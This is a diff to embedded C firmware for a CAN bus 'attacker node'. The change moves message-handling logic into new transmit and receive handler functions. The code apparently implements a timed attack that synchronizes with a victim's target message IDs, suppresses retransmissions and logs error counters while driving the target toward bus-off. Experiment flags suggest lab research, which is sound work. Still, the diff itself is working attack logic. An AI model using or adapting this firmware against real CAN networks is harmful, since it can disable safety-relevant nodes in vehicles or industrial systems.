@@ -80,6 +80,8 @@ volatile bool g_bRESETFlag = 0;
 volatile bool g_tick = false;
 volatile bool g_tick_2 = false;
 
+uint32_t g_last_target_rcv = 0;
+
 /* Synchronization works on a simple state machine.
  * The initial state is SYNC_MODE_INIT. Transition goes from this state to SYNC_MODE RESET after some delay from start.
  * The reset state is SYNC_MODE_RESET. In this state, the attacker node attempts to resynchronize with the victim.
@@ -593,12 +595,12 @@ initialize(void)
     ConfigureUART2();
 }
 
-bool
+void
 do_switch(int count)
 {
     uint32_t rec, tec;
     CANErrCntrGet(CAN0_BASE, &rec, &tec);
-    if (rec + tec > 0) return false;
+    if (rec + tec > 0) return;
 
     UARTprintf("%d\tSWITCH\n", count);
     TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
@@ -609,13 +611,92 @@ do_switch(int count)
         g_msg_since_idle = 10;
     }
     g_skip_attack = SKIP_ATTACK_2;
-    return true;
 }
 
 void
-got_message(int ID, bool is_RX)
+got_tx_message(int ID, int count)
 {
+    uint32_t rec, tec;
 
+    g_ui32TXMsgCount++;
+
+    if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
+        if (PRECEDED_ID == ID && g_target_id == TARGET_ID) {
+            delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
+            CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
+        } else if (PRECEDED_ID_2 == ID && g_target_id == TARGET_ID_2) {
+            delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
+            CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
+        }
+    }
+
+    if (g_target_id == ID) {
+        CANErrCntrGet(CAN0_BASE, &rec, &tec);
+        UARTprintf("%d\tATK-TX %d\tREC\t%u\tTEC\t%u\n", count, ID, rec, tec);
+    }
+#if defined(VERBOSE)
+            CANErrCntrGet(CAN0_BASE, &rec, &tec);
+            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
+#endif
+}
+
+int
+got_rx_message(int ID, int count)
+{
+    int rv = count;
+    uint32_t rec, tec;
+
+    if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
+        uint32_t now = TimerValueGet(TIMER3_BASE, TIMER_A);
+        // INTERVAL << 4 is Magic.
+        if (g_target_id == TARGET_ID && g_last_target_rcv && g_last_target_rcv - now > (INTERVAL<<2)) {
+            // more magic... sometimes it switches early, so ignore the startup
+            if (count > 200) {
+                do_switch(count);
+            }
+        }
+        // Disable retransmission of the attack when the preceded message is received
+        // TODO: predict when the target will be bus-off?
+        if ( PRECEDED_ID != HIGH_PRIO_ID && g_target_id == TARGET_ID ) {
+            if (ID == PRECEDED_ID ) {
+                delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
+                CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
+            }
+        } else if (PRECEDED_ID_2 != HIGH_PRIO_ID && g_target_id == TARGET_ID_2) {
+            if (ID == PRECEDED_ID_2 ) {
+                delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
+                CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
+            }
+        } else {
+            // do nothing.
+        }
+    }
+
+    if (ID == g_target_id) {
+        g_last_target_rcv = TimerValueGet(TIMER3_BASE, TIMER_A);
+        // check if need to resynchronize
+        if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
+            if (g_sync != SYNC_MODE_SYNCHED) {
+                if (g_sync == SYNC_MODE_RESET && g_msg_since_idle == 0) { /* g_msg_since_idle always 0 with SYNC_PERIOD */
+                    TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+                    uint32_t delta = g_ui32LastCANIntTimer - g_last_target_rcv; // counting down, so start - end = delta
+                    TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL-delta-(TARGET_XMIT_TIME*6)); /* FIXME: 6 is magic. */
+                    TimerEnable(TIMER2_BASE, TIMER_A);
+                    g_sync = SYNC_MODE_ADJUST;
+                    TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+                    TimerDisable(TIMER0_BASE, TIMER_A);
+                    g_tick = false;
+                    rv = 0;
+                }
+            }
+        }
+    }
+#if defined(VERBOSE)
+    // FIXME: print received target1 and target2 messages after attack presumed successful.
+        CANErrCntrGet(CAN0_BASE, &rec, &tec);
+        UARTprintf("%d\tRX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
+#endif
+    return rv;
 }
 
 int
@@ -623,9 +704,6 @@ main(void)
 {
     int count = 0, count_2 = 0;
     volatile uint32_t delay = 0;
-    uint32_t rec, tec;
-    bool attack1_success = false, attack2_success = false;
-    uint32_t last_target_rcv = 0;
 
     initialize();
 
@@ -648,7 +726,7 @@ main(void)
             // this flag is set when this node transmitted the reset message
             do_reset(count, count_2, g_ui8TXMsgData_RESET[0]);
             count = count_2 = 0;
-            last_target_rcv = 0;
+            g_last_target_rcv = 0;
         }
 
         if (g_tick == true) {
@@ -665,7 +743,7 @@ main(void)
             g_bTXTarget_1 = false;
             if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                 if (g_target_id == TARGET_ID) {
-                    attack1_success = do_switch(count);
+                    do_switch(count);
                 } else {
                     if (PRECEDED_ID_2 == TARGET_ID) {
                         if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
@@ -675,88 +753,40 @@ main(void)
                     }
                 }
             }
-            got_message(TARGET_ID, false);
-            if (g_target_id == TARGET_ID) {
-                CANErrCntrGet(CAN0_BASE, &rec, &tec);
-                UARTprintf("%d\tATK1-TX %d\tREC\t%u\tTEC\t%u\n", count, TARGET_ID, rec, tec);
-            }
+            got_tx_message(TARGET_ID, count);
         }
 
         if (g_bTXTarget_2) {
             g_bTXTarget_2 = false;
-            got_message(TARGET_ID_2, false);
-            CANErrCntrGet(CAN0_BASE, &rec, &tec);
-            UARTprintf("%d\tATK2-TX %d\tREC\t%u\tTEC\t%u\n", count, TARGET_ID_2, rec, tec);
+            got_tx_message(TARGET_ID_2, count);
         }
 
         if (g_bTXFlag_5) {
             g_bTXFlag_5 = false;
-            g_ui32TXMsgCount++;
-            got_message(TX_5_ID, false);
-
-            if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
-                if (PRECEDED_ID == HIGH_PRIO_ID) {
-                    if ( g_target_id == TARGET_ID ) {
-                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
-                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
-                    }
-                } else if (PRECEDED_ID_2 == HIGH_PRIO_ID) {
-                    if ( g_target_id == TARGET_ID_2 ) {
-                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
-                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
-                    }
-                } else {
-                    // nothing to do.
-                }
-            }
-
-#if defined(VERBOSE)
-            CANErrCntrGet(CAN0_BASE, &rec, &tec);
-            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
-#endif
+            got_tx_message(TX_5_ID, count);
         }
 
         if (g_bTXFlag_10) {
             g_bTXFlag_10 = false;
             g_ui32TXMsgCount++;
-            got_message(TX_10_ID, false);
-
-#if defined(VERBOSE)
-            CANErrCntrGet(CAN0_BASE, &rec, &tec);
-            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
-#endif
+            got_tx_message(TX_10_ID, count);
         }
 
         if (g_bTXFlag_100) {
             g_bTXFlag_100 = false;
-            g_ui32TXMsgCount++;
-            got_message(TX_100_ID, false);
-
-#if defined(VERBOSE)
-            CANErrCntrGet(CAN0_BASE, &rec, &tec);
-            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
-#endif
+            got_tx_message(TX_100_ID, count);
         }
 
         if (g_bTXFlag_1000) {
             g_bTXFlag_1000 = false;
             g_ui32TXMsgCount++;
-            got_message(TX_1000_ID, false);
-
-#if defined(VERBOSE)
-            CANErrCntrGet(CAN0_BASE, &rec, &tec);
-            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
-#endif
+            got_tx_message(TX_1000_ID, count);
         }
 
         if (g_bTXFlag) {
             g_bTXFlag = false;
             g_ui32TXMsgCount++;
-            got_message(0, false);
-#if defined(VERBOSE)
-            CANErrCntrGet(CAN0_BASE, &rec, &tec);
-            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
-#endif
+            got_tx_message(0, count);
         }
 
         if (g_bRXFlag) {
@@ -777,62 +807,12 @@ main(void)
                 // The ID 0xFF is used for RESET message.
                 do_reset(count, count_2, g_ui8RXMsgData[0]);
                 count = count_2 = 0;
-                last_target_rcv = 0;
+                g_last_target_rcv = 0;
                 continue;
             }
 
-            got_message(msg_id, true);
+            count = got_rx_message(msg_id, count);
 
-            if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
-                uint32_t now = TimerValueGet(TIMER3_BASE, TIMER_A);
-                // INTERVAL << 4 is Magic.
-                if (g_target_id == TARGET_ID && last_target_rcv && last_target_rcv - now > (INTERVAL<<2)) {
-                    // more magic... sometimes it switches early, so ignore the startup
-                    if (count > 200) {
-                        attack1_success = do_switch(count);
-                    }
-                }
-                // Disable retransmission of the attack when the preceded message is received
-                // TODO: predict when the target will be bus-off?
-                if ( PRECEDED_ID != HIGH_PRIO_ID && g_target_id == TARGET_ID ) {
-                    if (msg_id == PRECEDED_ID ) {
-                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
-                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
-                    }
-                } else if (PRECEDED_ID_2 != HIGH_PRIO_ID && g_target_id == TARGET_ID_2) {
-                    if (msg_id == PRECEDED_ID_2 ) {
-                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
-                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
-                    }
-                } else {
-                    // do nothing.
-                }
-            }
-
-            if (msg_id == g_target_id) {
-                last_target_rcv = TimerValueGet(TIMER3_BASE, TIMER_A);
-                // check if need to resynchronize
-                if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
-                    if (g_sync != SYNC_MODE_SYNCHED) {
-                        if (g_sync == SYNC_MODE_RESET && g_msg_since_idle == 0) { /* g_msg_since_idle always 0 with SYNC_PERIOD */
-                            TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
-                            uint32_t delta = g_ui32LastCANIntTimer - last_target_rcv; // counting down, so start - end = delta
-                            TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL-delta-(TARGET_XMIT_TIME*6)); /* FIXME: 6 is magic. */
-                            TimerEnable(TIMER2_BASE, TIMER_A);
-                            g_sync = SYNC_MODE_ADJUST;
-                            TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
-                            TimerDisable(TIMER0_BASE, TIMER_A);
-                            g_tick = false;
-                            count = 0;
-                        }
-                    }
-                }
-            }
-#if defined(VERBOSE)
-            // FIXME: print received target1 and target2 messages after attack presumed successful.
-                CANErrCntrGet(CAN0_BASE, &rec, &tec);
-                UARTprintf("%d\tRX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
-#endif
         } // g_bRXflag
 
         if (g_ui32ErrFlag) {
